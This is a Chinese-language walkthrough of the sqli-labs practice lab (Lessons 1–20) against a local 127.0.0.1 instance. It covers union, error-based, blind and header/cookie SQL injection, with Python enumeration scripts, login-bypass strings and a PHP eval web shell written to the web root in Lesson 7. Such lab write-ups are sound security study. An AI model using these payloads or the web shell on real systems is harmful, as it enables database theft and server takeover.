表名称 Table_type 表类型[system view|base table] Engine 使用的数据库引擎[MyISAM|CSV|InnoDB] Version 版本，默认值10 Row_format 行格式[Compact|Dynamic|Fixed] Table_rows 表里所存多少行数据 Avg_row_length 平均行长度 Data_length 数据长度 Max_data_length 最大数据长度 Index_length 索引长度 Data_free 空间碎片 Auto_increment 做自增主键的自动增量当前值 Create_time 表的创建时间 Update_time 表的更新时间 Check_time 表的检查时间 Table_collation 表的字符校验编码集 Checksum 校验和 Create_options 创建选项 Table_comment 表的注释、备注 【4】查询字段1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+ 字段 含义 table_schema&nbsp; 表所有者（对于schema的名称） table_name&nbsp; 表名 column_name&nbsp; 列名 ordinal_position&nbsp; 列标识号 column_default&nbsp; 列的默认值 is_nullable&nbsp; 列的为空性。如果列允许 null，那么该列返回 yes。否则，返回 no data_type&nbsp; 系统提供的数据类型 character_maximum_length 以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 null。有关更多信息，请参见数据类型 character_octet_length&nbsp; 以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 nu numeric_precision&nbsp; 近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 null numeric_precision_radix&nbsp; 近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 null numeric_scale&nbsp; 近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 null datetime_precision&nbsp; datetime 及 sql-92 interval 数据类型的子类型代码。对于其它数据类型，返回 null character_set_catalog&nbsp; 如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 null character_set_schema&nbsp; 如果列是字符数据或 text 数据类型，那么返回 dbo，指明字符集的所有者名称。否则，返回 null character_set_name&nbsp; 如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 null collation_catalog&nbsp; 如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 null collation_schema&nbsp; 返回 dbo，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 null collation_name&nbsp; 如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 null。 domain_catalog&nbsp; 如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 null domain_schema&nbsp; 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 null domain_name&nbsp; 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL 【5】查询用户名和密码1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(username) from security.users --+ 1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(password) from security.users --+ Lesson 2GET - Error based - Intiger based (基于错误的GET整型注入) 【1】查列数1http://127.0.0.1/Less-2/?id=1 and 1=1 --+ 1http://127.0.0.1/Less-2/?id=1 and 1=1 order by 3 --+ 列数为4 【2】查库名1http://127.0.0.1/Less-2/?id=-1 union select 1,2,database(); --+ 【3】获取所有表1http://127.0.0.1/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ 【4】查询字段1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+ 【5】查询用户名和密码1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(username) from security.users --+ 1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(password) from security.users --+ Lesson 3GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)尝试用单引号： 1http://127.0.0.1/Less-3/?id=-1 &#x27; union select 1,2,3 --+ 报错了，发现是因为括号没有闭合，那就闭合一下再试一试： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,2,3 --+ 注入正常，列数与前面相同，直接查库名： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,database(),3 --+ 查表名： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ 查字段： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+ 查数据： 12//usernamehttp://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(username) from security.users --+ 12//passwordhttp://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(password) from security.users --+ 源码123$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); 可以看到这里的$id是单引号和括号同时包裹起来的，所以payload中不仅要闭合单引号，还要闭合一个左括号，其他的和之前的题目一样 Lesson 4Error based - Double Quotes - String （基于错误的GET双引号字符型注入）看标题是基于双引号的，尝试一下： 1http://127.0.0.1/Less-4/?id=-1&quot; union select 1,2,3 --+ 发现还有个括号，加个括号： 1http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,2,3 --+ 剩下的就和前面的一样了，不再赘述 源码1234$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 5GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)正常输入看一下回显： 1http://127.0.0.1/Less-5/?id=1 与前几题不通，开始不显示具体信息了，可以判断是盲注，只能通过返回的状态来判断payload中注入的语句是否正确，尝试查一下列数： 1http://127.0.0.1/Less-5/?id=1&#x27; order by 4 --+ 有报错，列数为3，接下来查库名，因为是盲注，所以不能指望会显示出返回的信息，只能根据bool型的注入语句看有无回显来猜测库名。首先猜测库名的长度，构造下面的语句： 1http://127.0.0.1/Less-5/?id=1&#x27; and length(database())=1--+ 一直枚举到8出现回显，说明库名长度为8 1http://127.0.0.1/Less-5/?id=1&#x27; and substring(database(),1,1)=&#x27;a&#x27;--+ 发现没有显示信息，再尝试以下payload：尝试暴库名： 1http://127.0.0.1/Less-5/?id=1&#x27; and substring(database(),1,1)=&#x27;s&#x27;--+ 显示了，说明库名的第一个字符为s直接写脚本暴库名： 123456789101112131415161718192021222324252627282930import requestsURL = &quot;http://127.0.0.1/Less-5/&quot;# 获取数据库名长度def db_len(): for i in range(1,10): payload = &quot;?id=1&#x27; and length(database())=&#123;0&#125;--+&quot;.format(i) r = requests.get(URL + payload) if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;436&#x27;: return int(i)# 获取数据库名def db_name(length): name = &quot;&quot; for i in range(1,length+1): for j in range(0,26): char = chr(97+j) payload = &quot;?id=1&#x27; and substring(database(),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;--+&quot;.format(i,char) r = requests.get(URL + payload) if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;436&#x27;: name += char continue return namedef main(): print(db_name(db_len()))main() 执行结果如下：表名 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1)=&#x27;e&#x27;),1,0) --+ 列名： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,1)=&#x27;i&#x27;),1,0) --+ 用户名： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(username) from security.users),1,1)=&#x27;D&#x27;),1,0) --+ 密码： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(password) from security.users),1,1)=&#x27;D&#x27;),1,0) --+ 表名和列名和数据使用以上对应的payload简单修改程序就可以爆破出来 xmlupdate报错注入思路暴库名： 1http://127.0.0.1/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 暴内容： 1http://127.0.0.1/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select group_concat(username,0x5e,password) from users),1)),0x7e),1) --+ 这里并没有显示完整，问题是报错信息一次只能显示31个字符，将substr里的启示位置每次增加31，就可以将完整的数据暴出来 12345678910111213141516171819import requestsfrom lxml import etreeURL = &quot;http://127.0.0.1/Less-5/&quot;def main(): for i in range (0,100): payload = &quot;?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select\\ group_concat(username,0x5e,password) from users),&#123;0&#125;)),\\ 0x7e),1) --+&quot;.format(1+i*31) r = requests.get(URL+payload) if r.headers[&#x27;Content-Length&#x27;]==&#x27;459&#x27;:break html = etree.HTML(r.text) result = html.xpath(&#x27;/html/body/div/font[2]/font[1]/text()&#x27;) print(result)main() 结果如下： 源码12345678910111213141516171819&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 6Double Injection - Double Quotes - String (双注入GET双引号字符型注入)除了单引号变为双引号，与第五关没有区别，改一下Lesson5的程序就可以利用了 源码：12345678910111213141516171819&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 7Dump into outfile - String （导出文件GET字符型注入）id=1先看一下：提示用outfile，outfile是mysql中导出数据到文本文件中的语句，如： 1SELECT * FROM passwd INTO OUTFILE &#x27;/password.txt&#x27; 这样会在当前目录下创建一个文件，这里要注意，在SQL注入中利用Outfile，这里的路径只能是网站的绝对路径回到题目，测试后发现能够闭合的payload如下： 1http://127.0.0.1/Less-7/?id=1&#x27; )) --+ 尝试写入一句话木马： 1http://127.0.0.1/Less-7/?id=1&#x27; )) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#x27; into outfile &#x27;/var/www/html/bk.php&#x27; --+ 需要注意的是，由于我的环境是docker，刚开始使用上面的payload写入文件时发现写不进去，查阅资料后发现是缺少权限，就手动给网站目录加了可写权限虽然还是这个界面但是在网站目录下已经看到了写入的木马文件蚁剑连接： Lesson 8GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)布尔型的单引号盲注，爆表方法与Lesson5一样，程序改一下可以直接使用 1234567891011121314151617181920212223242526272829303132333435from turtle import htimport requestsfrom lxml import etreeURL = &quot;http://127.0.0.1/Less-8/&quot;# 获取数据库名长度def db_len(): for i in range(1,10): payload = &quot;?id=1&#x27; and length(database())=&#123;0&#125;--+&quot;.format(i) r = requests.get(URL + payload) # 这里改了判断内容长度 if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;442&#x27;: return int(i)# 获取数据库名def db_name(length): name = &quot;&quot; for i in range(1,length+1): for j in range(0,26): char = chr(97+j) payload = &quot;?id=1&#x27; and substring(database(),&#123;0&#125;,1)\\ =&#x27;&#123;1&#125;&#x27;--+&quot;.format(i,char) r = requests.get(URL + payload) # 这里也改了 if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;442&#x27;: name += char continue return namedef main(): print(db_name(db_len()))main() 其余的也与Lesson-5相同，不再赘述但由于错误不会返回任何信息，Lesson5中用到的xmlupdate()的思路也不能用 Lesson 9GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)这里无论输入是否合法都只会显示下面的页面：但是并没有ban掉sleep函数，结合题目，是基于时间的盲注，构造如下的payload： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(length(database())=8,sleep(5),1) --+ 当语句正确时延迟五秒：可以看到网页加载的时间，与语句不正确时有明显的的区别： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(length(database())=1,sleep(5),1) --+ 我们可以基于此来猜测库名表名数据等等库名： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1) --+ 表名： 12345//第一个表名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0，1),1,1)=&#x27;e&#x27;,sleep(5),1) --+//第二个表名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0，1),1,1)=&#x27;r&#x27;,sleep(5),1) --+ 列名： 12345//第一个列名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;,sleep(5),1) --+//第二个列名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 1,1),1,1)=&#x27;u&#x27;,sleep(5),1) --+ 数据： 12345//usernamehttp://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select username from users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1) --+//passwordhttp://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select password from users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1) --+ Lesson 10GET - Blind - Time based - double quotes (基于时间的双引号盲注)与Lesson9的唯一区别是闭合方式从单引号改为双引号，其余都一样，稍微修改一下payload就好 Lesson 11POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)打开题目，映入眼帘的是一个提交框是一道基于POST方法的题目，结合题目，单引号报错型，ok，那第一步要先抓个包看一下提交的参数名是什么，如下：接着在浏览器hackbar插件里面用POST方法提交就好了：构造payload： 1uname=admin&#x27; and 1=1 --+&amp;passwd=whatever 这里是POST提交的数据，先用单引号将uname=admin闭合，然后和一个恒真语句相与，并将后面的passwd字段注释掉，这样服务器收到的并执行的语句就是这样： 1@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;admin&#x27; and 1=1 --+&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; 直接登录成功：这也是一些后台万能密码的原理，其他的一些万能密码如下： admin&#39; -- admin&#39; # admin&#39;/* &#39; or 1=1-- &#39; or 1=1# &#39; or 1=1/* &#39;) or &#39;1&#39;=&#39;1-- &#39;) or (&#39;1&#39;=&#39;1--登录进来后，查一下列数：1uname=admin&#x27; order by 3 --+&amp;passwd=whatever 到3时报错暴库，这里找了个不存在的账号，否则不会显示union select出的内容：1uname=1&#x27; union select 1,database() --+&amp;passwd=whatever 爆表：1uname=1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27; --+&amp;passwd=whatever 爆字段：1uname=1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name= &#x27;users&#x27; --+&amp;passwd=whatever 爆用户名：1uname=1&#x27; union select 1,username from security.users limit 0,1 --+&amp;passwd=whatever 递增limit 0,1第一个参数的值枚举数据同理爆密码：1uname=1&#x27; union select 1,password from security.users limit 2,1 --+&amp;passwd=whatever 源码1234567891011121314151617if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Name:&#x27;.$uname); fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27;\\ and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); Lesson 12POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)加个双引号先尝试一下： 1uname=admin&quot; &amp;passwd=whatever 报错，发现还要闭合一个括号：加个括号： 1uname=admin&quot;) --+ &amp;passwd=whatever 登录成功，其余同Lesson11，不再赘述 源码1234567// connectivity$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=\\(&quot;$uname&quot;) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 13POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)尝试一下单引号： 1uname=admin&#x27; &amp;passwd=whatever 报错：发现还需要闭合一个单引号： 1uname=admin&#x27;) --+&amp;passwd=whatever 显示登录成功，但没有显示具体的信息，推测是盲注，测试一下 1uname=admin&#x27;) and if(length(database())=1,1,0)--+&amp;passwd=whatever 1uname=admin&#x27;) and if(length(database())=8,1,0)--+&amp;passwd=whatever 嗯，果然是，但是此处受Lesson5的启发，尝试一下基于xmlupdate()的报错注入： 1uname=admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=whatever 成功：剩下的就和Lesson 5一样了，不再赘述 源码//注意源码注释了显示用户名和密码信息的代码 12345678910111213141516171819202122232425@$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;)\\ and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; //echo &quot; You Have successfully logged in &quot; ; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; //echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; //echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; Lesson 14POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)尝试了一下单引号发现没用，双引号闭合登录成功： 1uname=admin&quot; --+&amp;passwd=whatever 但是没有显示信息，只能用盲注： 1uname=admin&quot; and if(length(database())=1,1,0) --+&amp;passwd=whatever 其余与Lesson 13一样，再试一下xmlupdate报错注入： 1uname=admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=whatever 成功，其余与Lesson13同 源码123456$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=\\$uname and password=$passwd LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 15POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)加单引号尝试一下： 1uname=admin&#x27; --+&amp;passwd=whatever 登录成功：尝试报错注入后，发现没有任何回显，直接bool盲注，根据是否登录成功来判断条件是否正确： 1uname=admin&#x27; and if(length(database())=1,1,0) --+&amp;passwd=whatever 1uname=admin&#x27; and if(length(database())=8,1,0) --+&amp;passwd=whatever 基于此修改Lesson 5的枚举脚本就即可得到数据 源码1234567891011121314151617181920212223242526@$sql=&quot;SELECT username, password FROM users WHERE username\\=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; Lesson 16POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)除了闭合方式从&#39;闭合变为&quot;)闭合外，与Lesson15一样 1uname=admin&quot;) and if(length(database())=8,1,0) --+&amp;passwd=whatever 源码123456$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username\\=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 17POST - Update Query- Error Based - String (基于错误的更新查询POST注入)打开题目，发现是密码重置的界面尝试重置一下admin的密码： 1uname=admin&amp;passwd=123 成功重置了admin的密码看一下源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;//making sure uname is not injectable$uname=check_input($_POST[&#x27;uname&#x27;]); $passwd=$_POST[&#x27;passwd&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;);fwrite($fp,&#x27;New Password:&#x27;.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; $row1 = $row[&#x27;username&#x27;]; //echo &#x27;Your Login name:&#x27;. $row1; $update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; 发现使用check_input函数对uname做了过滤：首先做了截断，将字符限制在15个以内，然后先判断phpmagic_quotes_gpc环境变量是否打开，取出转义的\\，最后，如果uname不是数字，则将其字符进行转义，是数字将其转为数字类型。 mysql_real_escape_string()函数：get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。当magic_quotes_gpc打开时，所有的&#39;(单引号)、&quot;(双引号)、\\(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符。（参考：https://www.jianshu.com/p/62d394c38230 ） addslashes()与stripslashes()函数：addslashes(string)函数返回在预定义字符之前添加反斜杠\\的字符串，stripslashes(string)函数删除由addslashes()函数添加的反斜杠。可见，想用uname进行注入十分困难，但passwd参数就比较容易，因为在源码的倒数第三行passwd参数被用来更新密码，这里的passwd没有经过任何过滤，构造payload：1uname=admin&amp;passwd=&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+ 这里用的还是基于xmlupdate()函数的报错注入，可以看到直接返回了数据库名：其余的部分与Lesson 5类似，不再赘述Lesson 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)随便输入看下回显，发现直接显示了我的ip地址和User-Agent头信息：再结合题目标题，应该是HTTP头注入，这里直接获取了我请求包中的信息显示了出来，看下源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0); function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,20); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; $uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; $IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your IP ADDRESS is: &#x27; .$IP; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your User Agent is: &#x27; .$uagent;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $uname = check_input($_POST[&#x27;uname&#x27;]); $passwd = check_input($_POST[&#x27;passwd&#x27;]); /* echo &#x27;Your Your User name:&#x27;. $uname; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27;. $passwd; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your User Agent String:&#x27;. $uagent; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your User Agent String:&#x27;. $IP; */ //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Agent:&#x27;.$uname.&quot;\\n&quot;); fclose($fp); $sql=&quot;SELECT users.username, users.password FROM users WHERE\\ users.username=$uname and users.password=$passwd ORDER BY \\ users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`,\\ `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; mysql_query($insert); //echo &#x27;Your IP ADDRESS is: &#x27; .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &#x27;Your User Agent is: &#x27; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; &#125;?&gt; 可以看到这里对输入的uname和passwd参数用check_input()做了严格的过滤，不太能注入，然而它直接将Http头中的user agent不加过滤的作为INSERT INTO语句的值，这就为我们注入提供了可能：我们可以burp抓包送到repeater模块，修改请求头的User-Agent字段，如下：构造上图中的包，可以看到回显如下：这里依旧用Lesson 5中提到的xmlupdate报错注入，构造如下的User-Agent头：可以在回显中看到xmlupdate的报错：剩下的就和Lesson 5相同了，不再赘述 Lesson 19打开实例，输入账号密码看一下回显：发现返回了HTTP头中referer字段的值，关于referer字段的作用，我在下面记录一下：referer字段用来提供访问来源的信息，当用户在地址栏输入网址或从标签页打开网址时，就不会发送referer字段，而在下面三种场景中会发送： 用户单击网页链接 用户发送表单 网页加载静态资源，如图片、脚本、样式在这三种场景下，浏览器会将当前网址作为referer字段放在请求头里并发送。回到题目，首先burp抓包送到repeater：可以看到这里的referer字段就是Lesson19网页的URL，尝试修改一下：报错：根据报错构造如下payload，依旧使用基于xmlupdate()的报错注入：其余同Lesson 18，不再赘述Lesson 20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)登录后显示如下界面：实际上这里显示的逻辑是：登录成功后前端又带着cookie使用基于GET方法请求了index页面，这一点从抓到的包可以看出来：这里是提交后POST包和它的响应包，可以看到这里的状态码是302，直接将页面重定向到了index.php，实际上这个返回页面看起来是这样的：只是快速重定向到了index.php，重定向发送了一个GET包，内容如下：可以看到其中包含了cookie信息，尝试注入：爆出错误信息：构造payload：爆出数据库名剩下的就和Lesson 5一样了，不再赘述 源码1234567$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = 